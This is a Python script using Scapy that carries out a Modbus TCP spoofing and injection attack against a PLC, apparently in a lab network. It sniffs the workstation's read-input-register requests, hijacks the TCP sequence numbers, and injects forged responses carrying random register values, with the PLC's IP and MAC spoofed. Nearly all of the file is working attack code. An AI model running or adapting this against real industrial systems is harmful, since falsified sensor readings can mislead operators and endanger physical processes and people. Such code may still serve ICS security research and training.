import sys
from scapy.all import *
Transaction_ID = 0
attacker = "192.168.88.201"
workstation = "192.168.88.202"
plc = "192.168.88.10"
interface = "eth0"
MAC_PLC = "a6:83:e7:d3:3f:64"
MAC_WORKSTATION = "08:00:27:1d:d0:b5"
MAC_ATTACKER = "08:00:27:88:85:88"
input_read_hex = "\\x00\\x00\\x00\\x06\\x01\\x04\\x00\\x00\\x00\\x01"

# plan :
# - detect read coil
# - get ack after read coil
# - that ack acknum ->  our ack seqnum
# - that ack seqnum + 12 -> our acknum
# - detect read input reg
# - we send ack,modbus

try:
    while True:
        flag = 1
        while flag:
            READ_INPUT = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == plc and x[TCP].flags == "PA")[0]
            try:
                if input_read_hex in str(READ_INPUT[Raw].load):
                    flag=0	
            except:
                flag=1

        Transaction_str = str(READ_INPUT[Raw].load.hex())[0:-20]
        Transaction_ID = int(Transaction_str,16)
        random_height = random.randint(0, 101)
        print(Transaction_ID, "," , random_height)
        # Modbus Layer Definition
        class ModbusTCP(Packet):
            name = "modbustcp"
            fields_desc = [ ShortField("Transaction Identifier", Transaction_ID), 
                            ShortField("Protocol Identifier", 0),
                            ShortField("Length", 5),
                            ByteField("Unit Identifier",1)
                            ]
                            
        #Modbus Write Multiple Coils                    
        class Modbus(Packet):
            name = "modbus"
            fields_desc = [ XByteField("Function Code", 4),   
                            XByteField("Byte Count", 2),
                            ShortField("Register Value (UINT16)", random_height)
                            ]

        ACK = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == workstation and x[TCP].flags == "A")[0]

        data_mb = {
            'ipsrc': ACK[IP].src,
            'ipdst': ACK[IP].dst,
            'sport': ACK[TCP].sport,
            'dport': ACK[TCP].dport,
            'seq': ACK[TCP].seq,
            'ack': ACK[TCP].ack,
            'window' : ACK[TCP].window,
            'id' : ACK[IP].id,
            'flags' : ACK[IP].flags
            }

        PAYLOAD_MODBUS = Ether(src=MAC_PLC, dst=MAC_ATTACKER)/ \
                    IP(src=plc, dst=workstation,ttl=128,id = data_mb['id'],flags=data_mb['flags']) / \
                    TCP(sport=data_mb['sport'], dport=data_mb['dport'],
                    flags="PA", window=1026, seq= data_mb['seq'], ack=data_mb['ack'])/ \
                    ModbusTCP()/Modbus()

        sendp(PAYLOAD_MODBUS, verbose=0, iface=interface)

        print("---------------------------- PACKET INJECTED")

        PAYLOAD_MODBUS.show()

except KeyboardInterrupt:
    print('Exited!')